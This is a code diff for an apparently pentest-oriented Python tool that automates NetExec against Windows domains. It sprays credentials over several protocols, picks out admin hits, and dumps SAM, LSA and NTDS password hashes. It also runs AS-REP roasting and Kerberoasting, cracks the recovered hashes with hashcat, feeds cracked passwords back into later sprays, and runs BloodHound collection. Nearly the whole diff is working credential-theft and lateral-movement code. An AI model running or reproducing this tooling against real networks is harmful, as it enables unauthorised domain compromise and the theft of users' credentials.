+        print(f"\n{'─' * BANNER_WIDTH}")
+
+        if successes:
+            pwn3d_hits = [s for s in successes if self._is_pwn3d(s[1])]
+            if pwn3d_hits:
+                print(f"\n  {RED}{BOLD}💀 ADMIN PWN3D ({len(pwn3d_hits)}){RESET}\n")
+                for label, msg in pwn3d_hits:
+                    print(f"    {RED}{BOLD}►{RESET} {BOLD}{label:<20}{RESET} {DIM}│{RESET} {RED}{msg}{RESET}")
+            print(f"\n  {GREEN}{BOLD}✓ VALID CREDENTIALS{RESET}\n")
+            for label, msg in successes:
+                icon = f"{RED}{BOLD}►{RESET}" if self._is_pwn3d(msg) else f"{GREEN}►{RESET}"
+                print(f"    {icon} {BOLD}{label:<20}{RESET} {DIM}│{RESET} {msg}")
+            print()
+        else:
+            print(f"\n  {RED}{BOLD}✗ No valid credentials found.{RESET}\n")
+
+        print(f"{'═' * BANNER_WIDTH}\n")
+
+    # ---------------------------------------------------------------
+    # Post-exploitation: DC detection, enum/modules, BloodHound
+    # ---------------------------------------------------------------
+
+    def _detect_dc_from_results(
+        self,
+        host: str,
+        results: dict[TaskKey, list[str]],
+        open_ports: set[int] | None,
+    ):
+        """Scan SMB output blocks for (domain:...) info and combine with nmap port
+        signals to identify whether `host` is a Domain Controller."""
+        domain_found: str | None = None
+        for (protocol, _local), blocks in results.items():
+            if protocol != "smb":
+                continue
+            for block in blocks:
+                m = SMB_DOMAIN_RE.search(block)
+                if m:
+                    domain_found = m.group(1).strip()
+                    break
+            if domain_found:
+                break
+
+        if not domain_found:
+            return
+
+        domain_lc = domain_found.lower()
+        self.host_domain[host] = domain_lc
+        self.domain_hosts.setdefault(domain_lc, set()).add(host)
+
+        # Signal B: LDAP (389/636) AND SMB (445) open → very likely a DC
+        looks_like_dc = False
+        source = "smb_banner"
+        if open_ports is not None:
+            has_ldap = 389 in open_ports or 636 in open_ports
+            has_smb = 445 in open_ports
+            if has_ldap and has_smb:
+                looks_like_dc = True
+                source = "nmap_ldap_smb"
+
+        # If we can't validate via nmap (--nmap off), fall back to the SMB banner
+        # signal alone — the host advertised a domain, so it speaks AD.
+        if not looks_like_dc and open_ports is None:
+            looks_like_dc = True
+
+        if looks_like_dc:
+            if self.cache:
+                self.cache.record_dc(domain_lc, host, source)
+            self._vprint(
+                V_VERBOSE,
+                f"  {CYAN}🩸 DC candidate{RESET} {DIM}{host} → domain={domain_lc} (source={source}){RESET}",
+            )
+
+    def _extract_valid_creds_from_results(
+        self, host: str, results: dict[TaskKey, list[str]]
+    ) -> list[dict]:
+        """Return [{host, protocol, local_auth, credential, raw}] for each [+] line."""
+        valid: list[dict] = []
+        for (protocol, local_auth), blocks in results.items():
+            for block in blocks:
+                for raw_line in block.split("\n"):
+                    marker, msg = self._parse_nxc_line(raw_line.strip())
+                    if marker != "[+]":
+                        continue
+                    cred = self._match_msg_to_credential(msg, protocol)
+                    if cred is None:
+                        continue
+                    valid.append({
+                        "host": host,
+                        "protocol": protocol,
+                        "local_auth": local_auth,
+                        "credential": cred,
+                        "raw": msg,
+                    })
+        return valid
+
+    def _match_msg_to_credential(self, msg: str, protocol: str) -> "Credential | None":
+        """Best-effort: figure out which Credential produced a [+] line.
+
+        nxc prints things like 'corp.local\\admin:Password' or '<user>:<hash>'.
+        We score every candidate cred by how specifically it appears in the
+        message and return the best match — preferring (user matched + secret
+        matched) over (user only) over (secret only). Falls back to the only
+        credential when the spray was single-cred."""
+        msg_lc = msg.lower()
+        best: tuple[int, Credential] | None = None
+
+        for cred in self.credentials:
+            user = (cred.user or "").lower()
+            secret = (cred.nthash or cred.password or "")
+            secret_lc = secret.lower()
+
+            user_hit = bool(user) and user in msg_lc
+            # For null-session creds (empty user), look for the tell-tale ':' artifact
+            # that nxc emits, e.g. 'SMB  10.x  445  HOST  [+] \\:' or 'Guest:'.
+            if not user:
+                user_hit = ":" in msg
+            secret_hit = (not secret) or (secret_lc in msg_lc)
+
+            if user_hit and secret_hit:
+                score = 3 if user else 2  # explicit user beats null-session match
+                if best is None or score > best[0]:
+                    best = (score, cred)
+            elif user_hit:
+                if best is None or 1 > best[0]:
+                    best = (1, cred)
+
+        if best:
+            return best[1]
+        return self.credentials[0] if len(self.credentials) == 1 else None
+
+    # Cap for the classifier read-back. nxc's [+]/[-]/info markers always
+    # appear early in the output (banner + first auth line) so 64 KB is
+    # plenty even for NTDS dumps that may run to hundreds of MB.
+    LOOT_HEAD_BYTES = 64 * 1024
+
+    def _run_nxc_action(
+        self,
+        protocol: str,
+        host: str,
+        credential: "Credential",
+        local_auth: bool,
+        extra_args: list[str],
+        loot_path: Path,
+    ) -> NxcActionResult:
+        """Run a follow-up nxc command and persist its output.
+
+        Streams stdout straight to the loot file instead of buffering in RAM —
+        critical for `--ntds` on real DCs where the dump can be hundreds of MB
+        and `capture_output=True` would OOM. stderr stays in memory (always
+        small) and is appended to the loot file after the run."""
+        cmd = self._build_nxc_command(protocol, host, credential, local_auth)
+        # Drop the --log clause: post-exploit output should live in loot/, not the main run log.
+        if "--log" in cmd:
+            i = cmd.index("--log")
+            del cmd[i : i + 2]
+        cmd.extend(extra_args)
+        self._log_command(f"post-ex {' '.join(extra_args)}".strip(), cmd, target=host)
+
+        try:
+            loot_path.parent.mkdir(parents=True, exist_ok=True)
+        except OSError as exc:
+            self._record_error(f"cannot create loot dir {loot_path.parent}: {exc}")
+            return NxcActionResult(ok=False, exit_code=13, stdout="", stderr=str(exc), loot_path=loot_path)
+
+        try:
+            with open(loot_path, "wb") as out_fh:
+                proc = subprocess.run(
+                    cmd,
+                    stdout=out_fh,
+                    stderr=subprocess.PIPE,
+                    timeout=self.subprocess_timeout,
+                )
+            stderr_text = (proc.stderr.decode("utf-8", errors="replace") if proc.stderr else "").strip()
+            if stderr_text:
+                try:
+                    with open(loot_path, "ab") as fh:
+                        fh.write(b"\n--- stderr ---\n")
+                        fh.write(stderr_text.encode("utf-8", errors="replace"))
+                except OSError:
+                    pass
+            # Read only the head for the classifier — markers are always near the top.
+            head = ""
+            try:
+                with open(loot_path, "rb") as fh:
+                    head = fh.read(self.LOOT_HEAD_BYTES).decode("utf-8", errors="replace")
+            except OSError:
+                pass
+            return NxcActionResult(
+                ok=(proc.returncode == 0),
+                exit_code=proc.returncode,
+                stdout=head, stderr=stderr_text, loot_path=loot_path,
+            )
+        except subprocess.TimeoutExpired:
+            try:
+                loot_path.write_text(f"timed out after {self.subprocess_timeout}s")
+            except OSError:
+                pass
+            return NxcActionResult(ok=False, exit_code=-1, stdout="", stderr="timed out", loot_path=loot_path)
+        except FileNotFoundError as exc:
+            self._record_error(f"nxc not found mid-run: {exc.filename}")
+            return NxcActionResult(ok=False, exit_code=127, stdout="", stderr=str(exc), loot_path=loot_path)
+        except PermissionError as exc:
+            self._record_error(f"cannot write loot {loot_path}: {exc}")
+            return NxcActionResult(ok=False, exit_code=13, stdout="", stderr=str(exc), loot_path=loot_path)
+        except OSError as exc:
+            # Disk full or similar mid-stream; we still want to keep going.
+            self._record_error(f"I/O error writing {loot_path}: {exc}")
+            return NxcActionResult(ok=False, exit_code=5, stdout="", stderr=str(exc), loot_path=loot_path)
+
+    @staticmethod
+    def _classify_action(result: NxcActionResult, ok_markers: list[str], extra_text: str = "") -> tuple[str, str, str]:
+        """Decide icon + short note for a post-exploit action.
+
+        Returns (status, icon, note) where status is 'ok' / 'noop' / 'fail'.
+        ok_markers are substrings expected in result.combined OR in extra_text
+        (used when output lands in a file rather than stdout, e.g. asreproast)."""
+        if not result.ok and result.exit_code == -1:
+            return "fail", ICON_TIMEOUT, "timed out"
+        if not result.ok:
+            return "fail", ICON_FAIL, f"subprocess exit {result.exit_code}"
+        combined = (result.combined + "\n" + extra_text).lower()
+        # Auth-level rejection means the cred has no privilege for this action.
+        if NxcAutomator._contains_any_pattern(combined, AUTH_RESPONSE_PATTERNS):
+            return "noop", ICON_NOOP, "access denied (no privilege)"
+        if not any(m.lower() in combined for m in ok_markers):
+            return "noop", ICON_NOOP, "no data produced"
+        return "ok", ICON_OK, ""
+
+    def _record_error(self, msg: str):
+        """Bookkeeping for --strict and the final summary."""
+        self.strict_errors.append(msg)
+
+    @staticmethod
+    def _pick_best_cred(entries: list[dict]) -> dict | None:
+        """Strongest cred wins: domain auth > local, password > hash, with pwn3d
+        always preferred over non-pwn3d."""
+        if not entries:
+            return None
+        ranked = sorted(entries, key=lambda v: (
+            0 if NxcAutomator._is_pwn3d(v["raw"]) else 1,
+            v["local_auth"],
+            v["credential"].is_hash,
+        ))
+        return ranked[0]
+
+    def _post_exploit_host(self, host: str, host_valid: list[dict]):
+        """Run SMB enum/modules/secretsdump and LDAP enum on the best creds
+        we have for this host."""
+        if not (self.enum_enabled or self.modules or self.secretsdump):
+            return
+
+        smb_target = self._pick_best_cred([v for v in host_valid if v["protocol"] == "smb"])
+        ldap_target = self._pick_best_cred(
+            [v for v in host_valid if v["protocol"] == "ldap" and not v["local_auth"]]
+        )
+
+        if smb_target:
+            self._post_exploit_smb(host, smb_target)
+        if ldap_target and self.enum_enabled:
+            self._post_exploit_ldap(host, ldap_target)
+
+    def _is_likely_dc(self, host: str) -> bool:
+        """Heuristic: a host is a DC if our nmap cache shows LDAP open on it.
+        If we don't have cache data, fall back to 'maybe' (attempt anyway)."""
+        if not self.cache:
+            return True
+        cached = self.cache.get_fresh(host)
+        if cached is None:
+            return True
+        return any(cached.get(p) == "open" for p in (389, 636))
+
+    def _print_action(self, icon: str, name: str, note: str, loot_path: Path, name_width: int = 12):
+        suffix = f" {DIM}{note}{RESET}" if note else ""
+        print(f"    {icon} {name:<{name_width}} {DIM}→ {_truncate_path(loot_path)}{RESET}{suffix}")
+
+    def _post_exploit_smb(self, host: str, target: dict):
+        cred = target["credential"]
+        local = target["local_auth"]
+        scope = self._auth_scope(local)
+        is_pwn3d = self._is_pwn3d(target["raw"])
+        host_dir = self.loot.dir_for(LootStore.safe_name(host), "smb", scope)
+
+        if self.enum_enabled:
+            print(f"\n  {ICON_SUBTASK} enum {host} {DIM}(SMB {scope} as {cred.user or '<empty>'}){RESET}")
+            for action in SMB_ENUM_ACTIONS:
+                out = host_dir / f"{action['name']}.txt"
+                res = self._run_nxc_action("smb", host, cred, local, action["args"], out)
+                status, icon, note = self._classify_action(res, action["ok_markers"])
+                self._print_action(icon, action["name"], note, out)
+                if status == "fail":
+                    self._record_error(f"enum {action['name']} on {host}: {note}")
+                if action["name"] == "pass-pol" and status == "ok":
+                    self._inspect_pass_pol(host, out)
+
+        for mod in self.modules:
+            print(f"\n  {ICON_SUBTASK} module {host} {DIM}(SMB {scope} as {cred.user or '<empty>'}) -M {mod}{RESET}")
+            out = host_dir / f"module-{LootStore.safe_name(mod)}.txt"
+            res = self._run_nxc_action("smb", host, cred, local, ["-M", mod], out)
+            # Modules are opaque — we don't know what 'ok' looks like; trust exit code.
+            if not res.ok:
+                self._print_action(ICON_FAIL, mod, f"exit {res.exit_code}", out, name_width=24)
+                self._record_error(f"module {mod} on {host} failed")
+            elif res.combined.strip() == "":
+                self._print_action(ICON_NOOP, mod, "no output", out, name_width=24)
+            else:
+                self._print_action(ICON_OK, mod, "", out, name_width=24)
+
+        if self.secretsdump and is_pwn3d:
+            self._dump_secrets(host, cred, local, host_dir)
+
+    def _post_exploit_ldap(self, host: str, target: dict):
+        cred = target["credential"]
+        host_dir = self.loot.dir_for(LootStore.safe_name(host), "ldap", "domain")
+        print(f"\n  {ICON_SUBTASK} enum {host} {DIM}(LDAP domain as {cred.user or '<empty>'}){RESET}")
+        for action in LDAP_ENUM_ACTIONS:
+            out = host_dir / f"{action['name']}.txt"
+            substituted = [str(out) if a == "{outfile}" else a for a in action["args"]]
+            res = self._run_nxc_action("ldap", host, cred, False, substituted, out)
+            # For asreproast/kerberoasting nxc writes to the file, not stdout —
+            # so we also read the file to check for the krb marker.
+            extra = ""
+            if action["name"] in ("asreproast", "kerberoasting") and out.exists():
+                try:
+                    extra = out.read_text(errors="replace")
+                except OSError:
+                    pass
+            status, icon, note = self._classify_action(res, action["ok_markers"], extra)
+            self._print_action(icon, action["name"], note, out, name_width=14)
+            if status == "fail":
+                self._record_error(f"ldap {action['name']} on {host}: {note}")
+            if action["name"] in ("asreproast", "kerberoasting") and status == "ok":
+                self._harvest_kerberos_hashes(host, action["name"], out)
+
+    def _dump_secrets(self, host: str, cred: "Credential", local_auth: bool, host_dir: Path):
+        """On (Pwn3d!) cred, dump SAM/LSA/NTDS hashes and grow the combo file."""
+        print(f"\n  {ICON_PWN3D} secretsdump {host} {DIM}(SMB as {cred.user}){RESET}")
+        for action in SMB_SECRETS_ACTIONS:
+            name = action["name"]
+            out = host_dir / f"secrets-{name}.txt"
+            # Skip NTDS on non-DC hosts — nxc would just error out.
+            if action["requires_dc"] and not self._is_likely_dc(host):
+                self._print_action(ICON_SKIP, name, "not a DC", out, name_width=6)
+                continue
+            res = self._run_nxc_action("smb", host, cred, local_auth, action["args"], out)
+            status, icon, note = self._classify_action(res, action["ok_markers"])
+            self._print_action(icon, name, note, out, name_width=6)
+            if status == "fail":
+                self._record_error(f"secretsdump {name} on {host}: {note}")
+            if status == "ok":
+                self._harvest_smb_hashes(host, name, out)
+
+    def _harvest_smb_hashes(self, host: str, source: str, out: Path):
+        """Parse SAM/LSA/NTDS output for user:rid:lm:nt::: lines and append
+        as 'user:lm:nt' to the combo-grow file. If --crack is on, fire
+        hashcat on the freshly-collected NT hashes."""
+        try:
+            text = out.read_text(errors="replace")
+        except OSError:
+            return
+        seen = 0
+        for m in HASH_DUMP_LINE_RE.finditer(text):
+            user, lm, nt = m.group("user"), m.group("lm"), m.group("nt")
+            # Avoid duplicates
+            entry = {"host": host, "source": source, "user": user, "lm": lm, "nt": nt}
+            if entry in self.harvested_hashes:
+                continue
+            self.harvested_hashes.append(entry)
+            seen += 1
+        if seen:
+            self._append_grow_combo(self.harvested_hashes[-seen:])
+            print(f"    {GREEN}🧪 +{seen} hash(es) → {_truncate_path(self._effective_grow_combo())}{RESET}")
+            if self.crack_enabled and self.cracker:
+                self._crack_nt_hashes()
+
+    def _crack_nt_hashes(self):
+        """Write every harvested NT hash to a single file and crack it.
+        Hashcat with the same potfile picks up new hashes incrementally."""
+        nt_hashes = sorted({h["nt"] for h in self.harvested_hashes if h.get("nt")})
+        if not nt_hashes:
+            return
+        cracked_dir = self.cracker.cracked_dir()
+        hash_file = cracked_dir / "nt-hashes.txt"
+        try:
+            hash_file.write_text("\n".join(nt_hashes) + "\n")
+        except OSError as exc:
+            print(f"    {ICON_FAIL} cannot write {hash_file}: {exc}", file=sys.stderr)
+            self._record_error(f"cracker hash-file write failed: {exc}")
+            return
+        wl = self.cracker.find_wordlist()
+        print(f"    {ICON_CRACK} cracking {len(nt_hashes)} NT hash(es) with {_truncate_path(wl)}…")
+        ok, pairs = self.cracker.crack("nt", hash_file)
+        if not ok:
+            print(f"    {ICON_FAIL} cracker did not run (see {_truncate_path(hash_file)})", file=sys.stderr)
+            self._record_error(f"cracker failed on NT hashes: {self.cracker.last_stderr or 'unknown'}")
+            return
+        nt_to_user = {h["nt"].lower(): h["user"] for h in self.harvested_hashes if h.get("nt")}
+        appended = 0
+        for hash_str, plain in pairs:
+            user = nt_to_user.get(hash_str.lower())
+            if not user:
+                continue
+            entry = {"user": user, "password": plain, "source": "nt-crack"}
+            if entry in self.cracked_creds:
+                continue
+            self.cracked_creds.append(entry)
+            appended += 1
+        if appended:
+            self._append_plain_creds_to_grow_combo(self.cracked_creds[-appended:])
+            print(f"    {ICON_CRACK} {BOLD}cracked {appended}/{len(nt_hashes)}{RESET} → appended to {_truncate_path(self._effective_grow_combo())}")
+            for e in self.cracked_creds[-appended:]:
+                print(f"      {GREEN}+ {e['user']}:{e['password']}{RESET}")
+        else:
+            hint = self.cracker.diagnose_zero_cracks()
+            tail = f" — {hint}" if hint else " — try --crack-rules best64 or a bigger wordlist"
+            print(f"    {ICON_NOOP} 0/{len(nt_hashes)} cracked{tail}")
+
+    def _harvest_kerberos_hashes(self, host: str, source: str, out: Path):
+        """asreproast/kerberoasting output is already in hashcat-ready format
+        (e.g. $krb5asrep$23$user@DOMAIN: ...). If --crack is on, fire hashcat
+        on the file directly with the right -m mode."""
+        try:
+            text = out.read_text(errors="replace")
+        except OSError:
+            return
+        # Count hashcat-style hashes for the summary
+        n = text.count("$krb5")
+        if n:
+            print(f"    {GREEN}🧪 +{n} {source} hash(es) ready for hashcat{RESET}")
+            self.harvested_hashes.append({"host": host, "source": source, "user": None, "lm": None, "nt": None, "kerberos_file": str(out), "count": n})
+            if self.crack_enabled and self.cracker:
+                self._crack_kerberos_hashes(out, source)
+
+    def _crack_kerberos_hashes(self, hash_file: Path, source: str):
+        """Run hashcat against an ASREProast (-m 18200) or Kerberoasting (-m 13100) file."""
+        hash_type = "asrep" if source == "asreproast" else "tgs"
+        user_re = KRB_AS_REP_USER_RE if hash_type == "asrep" else KRB_TGS_REP_USER_RE
+        wl = self.cracker.find_wordlist()
+        print(f"    {ICON_CRACK} cracking {source} with {_truncate_path(wl)}…")
+        ok, pairs = self.cracker.crack(hash_type, hash_file)
+        if not ok:
+            print(f"    {ICON_FAIL} cracker did not run (see {_truncate_path(hash_file)})", file=sys.stderr)
+            self._record_error(f"cracker failed on {source}: {self.cracker.last_stderr or 'unknown'}")
+            return
+        appended = 0
+        for hash_str, plain in pairs:
+            m = user_re.search(hash_str)
+            user = m.group(1) if m else f"krb-{hash_type}"
+            entry = {"user": user, "password": plain, "source": f"{source}-crack"}
+            if entry in self.cracked_creds:
+                continue
+            self.cracked_creds.append(entry)
+            appended += 1
+        if appended:
+            self._append_plain_creds_to_grow_combo(self.cracked_creds[-appended:])
+            print(f"    {ICON_CRACK} {BOLD}cracked {appended} {source} hash(es){RESET} → appended to {_truncate_path(self._effective_grow_combo())}")
+            for e in self.cracked_creds[-appended:]:
+                print(f"      {GREEN}+ {e['user']}:{e['password']}{RESET}")
+        else:
+            hint = self.cracker.diagnose_zero_cracks()
+            tail = f" — {hint}" if hint else ""
+            print(f"    {ICON_NOOP} 0 cracked from {source}{tail}")
+
+    def _append_plain_creds_to_grow_combo(self, entries: list[dict]):
+        """Append plaintext (user, password) pairs to the grow-combo file —
+        same format that --combo accepts on the next run."""
+        path = self._effective_grow_combo()
+        path.parent.mkdir(parents=True, exist_ok=True)
+        with open(path, "a") as fh:
+            for e in entries:
+                fh.write(f"{e['user']}:{e['password']}\n")
+
+    def _effective_grow_combo(self) -> Path:
+        return self.grow_combo_path or (self.loot.root / "auto-grown-creds.txt")
+
+    def _append_grow_combo(self, entries: list[dict]):
+        """Append harvested hashes in combo-file format (user:lm:nt)."""
+        path = self._effective_grow_combo()
+        path.parent.mkdir(parents=True, exist_ok=True)
+        with open(path, "a") as fh:
+            for e in entries:
+                if not e.get("nt"):
+                    continue
+                fh.write(f"{e['user']}:{e['lm']}:{e['nt']}\n")
+
+    def _inspect_pass_pol(self, host: str, out: Path):
+        """Parse `nxc smb --pass-pol` output for lockout threshold/duration
+        and warn loudly when it could lock accounts during the spray."""
+        try:
+            text = out.read_text(errors="replace")
+        except OSError:
+            return
+        m = LOCKOUT_THRESHOLD_RE.search(text)
+        if not m:
+            return
+        threshold = int(m.group(1))
+        if threshold == 0:
+            return  # 'No lockout' policy
+        duration_match = LOCKOUT_DURATION_RE.search(text)
+        duration = duration_match.group(1).strip() if duration_match else "?"
+        per_user_attempts = sum(
+            1 for c in self.credentials
+            if c.user and c.user.lower() not in {u for u, _ in NULL_SESSION_CREDS}
+        )
+        self.lockout_warnings.append({"host": host, "threshold": threshold, "duration": duration})
+        if per_user_attempts > threshold:
+            print(
+                f"\n  {ICON_WARN} {RED}{BOLD}LOCKOUT RISK on {host}{RESET}: "
+                f"{RED}policy={threshold} attempts / {duration}, "
+                f"you're spraying ~{per_user_attempts} per user.{RESET}",
+                file=sys.stderr,
+            )
+            if self.delay == 0:
+                print(f"    {DIM}→ consider --delay 60 --jitter 30 for the next run{RESET}", file=sys.stderr)
+            self._record_error(f"lockout risk on {host} (policy={threshold})")
+
+    @staticmethod
+    def _resolve_dc_via_dns(domain: str, timeout: int = 5) -> list[str]:
+        """Ask DNS for SRV _ldap._tcp.dc._msdcs.<domain> via dig or nslookup.
+        Returns a list of resolved DC hostnames/IPs (best-effort, may be empty)."""
+        query = f"_ldap._tcp.dc._msdcs.{domain}"
+        # dig prints lines like '0 100 389 dc01.corp.local.' (prio weight port target)
+        for tool, args in (
+            ("dig", ["+short", "+timeout=" + str(timeout), query, "SRV"]),
+            ("nslookup", ["-type=SRV", query]),
+        ):
+            if shutil.which(tool) is None:
+                continue
+            try:
+                result = subprocess.run([tool, *args], capture_output=True, text=True, timeout=timeout + 1)
+            except subprocess.TimeoutExpired:
+                continue
+            if result.returncode != 0:
+                continue
+            hosts: list[str] = []
+            for line in (result.stdout or "").splitlines():
+                line = line.strip()
+                if not line:
+                    continue
+                if tool == "dig":
+                    parts = line.split()
+                    if len(parts) >= 4:
+                        hosts.append(parts[-1].rstrip("."))
+                else:  # nslookup
+                    if "svr hostname" in line.lower() or "service location" in line.lower():
+                        host = line.split("=")[-1].strip().rstrip(".")
+                        if host:
+                            hosts.append(host)
+            if hosts:
+                return hosts
+        return []
+
+    def _pick_bloodhound_cred(self, domain: str) -> "Credential | None":
+        """Choose a credential that successfully authenticated against this domain."""
+        for entry in self.valid_creds:
+            host = entry["host"]
+            cred = entry["credential"]
+            if entry["local_auth"]:
+                continue
+            if self.host_domain.get(host) == domain.lower():
+                return cred
+        return None
+
+    def _run_bloodhound_pass(self):
+        """For every discovered domain, run bloodhound-python once (TTL-deduped)."""
+        if not self.bloodhound_runner:
+            return
+        if not self.domain_hosts:
+            self._vprint(V_VERBOSE, f"  {DIM}🩸 BloodHound: no domain detected, skipping{RESET}")
+            return
+
+        print(f"\n{'─' * BANNER_WIDTH}")
+        print(f"  {CYAN}{BOLD}🩸 BloodHound Collection{RESET}")
+        print(f"{'─' * BANNER_WIDTH}")
+
+        for domain, hosts in self.domain_hosts.items():
+            cached = self.bloodhound_runner.already_collected(domain)
+            if cached:
+                ran_at = datetime.fromtimestamp(cached["ran_at"]).strftime("%Y-%m-%d %H:%M")
+                print(f"  {YELLOW}↷ {domain}{RESET} {DIM}already collected at {ran_at} → skipped{RESET}")
+                print(f"     {DIM}→ {cached['output_path']}{RESET}")
+                continue
+
+            # DC candidate sources, in order of preference:
+            # 1. DNS SRV (authoritative, when dig/nslookup are available)
+            # 2. SQLite cache (DCs identified in past or current runs)
+            # 3. Hosts that just advertised this domain in nxc's SMB banner
+            dcs: list[str] = []
+            dns_dcs = self._resolve_dc_via_dns(domain)
+            if dns_dcs:
+                dcs = dns_dcs
+                self._vprint(V_VERBOSE, f"  {DIM}🩸 DNS SRV → {len(dcs)} DC(s): {', '.join(dcs)}{RESET}")
+                if self.cache:
+                    for ip in dcs:
+                        self.cache.record_dc(domain, ip, "dns_srv")
+            elif self.cache:
+                dc_records = self.cache.get_dcs(domain)
+                if dc_records:
+                    dcs = [ip for ip, _src in dc_records]
+            if not dcs:
+                dcs = list(hosts)
+
+            if not dcs:
+                print(f"  {ICON_NOOP} {domain} {DIM}no DC candidate identified — skipped{RESET}")
+                continue
+
+            cred = self._pick_bloodhound_cred(domain)
+            if not cred:
+                print(f"  {ICON_NOOP} {domain} {DIM}no domain credential available — skipped{RESET}")
+                continue
+
+            dc_ip = dcs[0]
+            print(f"  {ICON_SUBTASK} {domain} {DIM}via {dc_ip} as {cred.user}{RESET}")
+            success, out_dir, err = self.bloodhound_runner.collect(domain, dc_ip, cred)
+            if success:
+                print(f"    {ICON_OK} collected {DIM}→ {_truncate_path(out_dir)}{RESET}")
+            else:
+                print(f"    {ICON_FAIL} failed {DIM}{err}{RESET}")
+                print(f"    {DIM}→ {_truncate_path(out_dir)} (see stderr.log){RESET}")
+                self._record_error(f"bloodhound {domain}: {err or 'unknown'}")
+
+    @staticmethod
+    def _is_expandable_spec(target: str) -> bool:
+        """True if the target is a CIDR / range that nmap will expand into many hosts."""
+        return "/" in target or "-" in target
+
+    def _discover_target(self, target: str) -> dict[str, set[int]]:
+        """Resolve a target spec into {host: {open_ports}}.
+
+        Without --nmap, returns {target: set()} (signals 'no filtering').
+        With --nmap, runs scan (cache-aware for single hosts) and returns
+        only hosts with at least one open port.
+        """
+        if not self.nmap_enabled or self.scanner is None:
+            return {target: set()}
+
+        expandable = self._is_expandable_spec(target)
+
+        if self.cache and not expandable:
+            cached = self.cache.get_fresh(target)
+            if cached is not None:
+                open_set = {p for p, st in cached.items() if st == "open"}
+                self._vprint(
+                    V_VERBOSE,
+                    f"  {DIM}🗎 cache hit {target} → {len(open_set)} open port(s){RESET}",
+                )
+                return {target: open_set} if open_set else {}
+            self._vprint(V_VERBOSE, f"  {DIM}🗎 cache miss {target} → running nmap{RESET}")
+
+        scan_result = self.scanner.scan(target)
+        self._vprint(
+            V_DEBUG,
+            f"  {DIM}🔍 nmap raw: {len(scan_result)} host(s) with open ports{RESET}",
+        )
+
+        if self.cache:
+            if not expandable:
+                # nmap may report results keyed by IP rather than the hostname/IP given.
+                ports = scan_result.get(target)
+                if ports is None and len(scan_result) == 1:
+                    ports = next(iter(scan_result.values()))
+                self.cache.store(target, ports or {})
+            else:
+                for ip, ports in scan_result.items():
+                    self.cache.store(ip, ports)
+
+        return {
+            host: {p for p, st in ports.items() if st == "open"}
+            for host, ports in scan_result.items()
+            if any(st == "open" for st in ports.values())
+        }
+
+    @staticmethod
+    def _format_open_ports(open_ports: set[int]) -> str:
+        protos: list[str] = []
+        for proto in ALL_PROTOCOLS:
+            if any(p in open_ports for p in PROTOCOL_PORTS.get(proto, [])):
+                protos.append(proto.upper())
+        return ", ".join(protos) if protos else "none"
+
+    def _validate_flag_combinations(self):
+        """Warn (don't fail) when the user enabled a feature whose prerequisites
+        can never be met given the other flags. Cheap insurance against
+        'why didn't anything happen?' mysteries."""
+        warnings: list[str] = []
+        if self.crack_enabled and not self.secretsdump and not self.enum_enabled:
+            warnings.append(
+                "--crack is enabled but no hash sources are. Add --secretsdump "
+                "and/or --enum so the cracker has something to chew on."
+            )
+        if self.secretsdump and not self.enum_enabled:
+            warnings.append(
+                "--secretsdump without --enum skips the lockout-policy probe; "
+                "you won't get the password-policy warning before spraying."
+            )
+        only = self.only_protocols
+        if self.bloodhound_enabled and only and "smb" not in only and "ldap" not in only:
+            warnings.append(
+                "--bloodhound needs SMB or LDAP, but --only excludes both. "
+                "BloodHound collection will be skipped."
+            )
+        if self.modules and only and "smb" not in only:
+            warnings.append("--modules run on SMB but --only excludes it.")
+        for w in warnings:
+            print(f"  {ICON_WARN} {w}\n", file=sys.stderr)
+
+    @staticmethod
+    def _is_nxc_available() -> bool:
+        try:
+            subprocess.run(["nxc", "--version"], capture_output=True, timeout=5)
+            return True
+        except (FileNotFoundError, subprocess.TimeoutExpired):
+            return False
+
+    def run(self):
+        task_count = len(ALL_PROTOCOLS) + len(LOCAL_AUTH_PROTOCOLS)
+        pair_count = len(self.credentials)
+        total_attempts = len(self.targets) * pair_count * task_count
+
+        # Pre-flight: fail fast if nxc isn't installed — otherwise every
+        # attempt will produce an unhelpful 'No such file or directory' error.
+        # --scan-only doesn't need nxc, so skip the check in that path.
+        if not self.scan_only and not self._is_nxc_available():
+            print(
+                f"\n  {RED}{BOLD}✗ nxc not found in PATH.{RESET}\n"
+                f"  {DIM}Install with:{RESET} {BOLD}./scripts/update-nxc.sh{RESET}\n"
+                f"  {DIM}or:           {RESET} {BOLD}pipx install netexec{RESET}\n",
+                file=sys.stderr,
+            )
+            sys.exit(127)
+
+        if self.nmap_enabled and self.scanner is not None and not NmapScanner.is_available():
+            print(f"  {ICON_WARN} nmap not found in PATH — disabling pre-scan\n", file=sys.stderr)
+            self.nmap_enabled = False
+            self.scanner = None
+            if self.scan_only:
+                print(f"  {ICON_FAIL} --scan-only requires nmap; aborting.\n", file=sys.stderr)
+                sys.exit(2)
+
+        if self.bloodhound_runner and not BloodHoundRunner.is_available():
+            print(f"  {ICON_WARN} bloodhound-python not found in PATH — disabling --bloodhound\n", file=sys.stderr)
+            self.bloodhound_runner = None
+            self.bloodhound_enabled = False
+
+        if self.cracker and self.crack_enabled:
+            chosen = self.cracker.cracker()
+            wl = self.cracker.find_wordlist()
+            if not chosen:
+                print(f"  {ICON_WARN} neither hashcat nor john found in PATH — disabling --crack\n", file=sys.stderr)
+                self.crack_enabled = False
+                self.cracker = None
+            elif not wl:
+                print(
+                    f"  {ICON_WARN} wordlist not found — disabling --crack.\n"
+                    f"  {DIM}Looked in:{RESET}\n"
+                    + "".join(f"    {DIM}- {p}{RESET}\n" for p in WORDLIST_DEFAULT_PATHS)
+                    + f"  {DIM}Pass --wordlist /path/to/file or download rockyou:{RESET}\n"
+                    f"    {DIM}wget -O ~/wordlists/rockyou.txt {ROCKYOU_DOWNLOAD_URL}{RESET}\n",
+                    file=sys.stderr,
+                )
+                self.crack_enabled = False
+                self.cracker = None
+
+        self._validate_flag_combinations()
+
+        if self.verbosity > V_QUIET:
+            self._print_scan_banner(total_attempts)
+
+        try:
+            for raw_target in self.targets:
+                discovered = self._discover_target(raw_target)
+
+                if not discovered:
+                    msg = "no open ports / unreachable" if self.nmap_enabled else "no targets"
+                    if self.verbosity > V_QUIET:
+                        print(f"  {DIM}► {raw_target} — {msg}{RESET}\n")
+                    continue
+
+                for host, open_ports in discovered.items():
+                    tasks = self._build_protocol_tasks(open_ports if self.nmap_enabled else None)
+
+                    if self.verbosity > V_QUIET:
+                        header = f"  {GREEN}{BOLD}► {host}{RESET}"
+                        if self.nmap_enabled:
+                            header += f" {DIM}[{self._format_open_ports(open_ports)}]{RESET}"
